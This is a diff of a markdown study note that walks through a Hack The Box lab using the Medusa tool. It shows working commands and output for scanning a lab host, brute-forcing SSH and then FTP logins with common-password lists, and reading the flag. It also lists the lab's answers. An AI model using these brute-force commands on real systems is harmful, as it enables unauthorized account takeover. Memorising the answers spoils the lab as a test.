@@ -1,7 +1,7 @@
 # Medusa
 ## Command Syntax and Parameter Table
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
 ```
 
@@ -13,7 +13,7 @@ masterofblafu@htb[/htb]$ medusa [target_options] [credential_options] -M module 
 
 ## Testing for Empty or Default Passwords
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
 ```
 
@@ -27,7 +27,7 @@ This command instructs Medusa to:
 ## Questions
 1. What was the password for the ftpuser? **Answer: qqww1122**
    - Identified SSH open the target:
-        ```sh
+        ```shellsession
         $ sudo nmap -sV -Pn -p 30158 154.57.164.69
         Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-13 23:43 CDT
         Nmap scan report for 154-57-164-72.static.isp.htb.systems (154.57.164.72)
@@ -38,14 +38,14 @@ This command instructs Medusa to:
         Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
         ```
    - Try to brute force ssh credentials for the `sshuser` account → found `sshuser`:`1q2w3e4r5t`
-        ```sh
+        ```shellsession
         $ medusa -h 154.57.164.69 -n 30158 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3 -f
         <SNIP>
         ACCOUNT FOUND: [ssh] Host: 154.57.164.69 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
         <SNIP>
         ```
    - SSH to the target with the found credentials and discover that FTP is open on the target machine:
-        ```sh
+        ```shellsession
         $ ssh -p 30158 sshuser@154.57.164.69
         sshuser@ng-1863259-loginbfservice-rihof-7b97d4bcfc-52hgr:~$ nmap localhost
         Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 07:50 UTC
@@ -60,7 +60,7 @@ This command instructs Medusa to:
         Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
         ```
    - Run medusa itself on this machine → found the password for ftpuser: `qqww1122`
-        ```sh
+        ```shellsession
         sshuser@ng-1863259-loginbfservice-rihof-7b97d4bcfc-52hgr:~$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 3 -f
         Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
         <SNIP>
@@ -69,7 +69,7 @@ This command instructs Medusa to:
         ```  
 2. After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt? **Answer: HTB{SSH_and_FTP_Bruteforce_Success}**
    - Login to ftp with the found credentials and read the flag:
-        ```sh
+        ```shellsession
         sshuser@ng-1863259-loginbfservice-rihof-7b97d4bcfc-52hgr:~$ ftp ftp://ftpuser:qqww1122@localhost
         Trying [::1]:21 ...
         Connected to localhost.
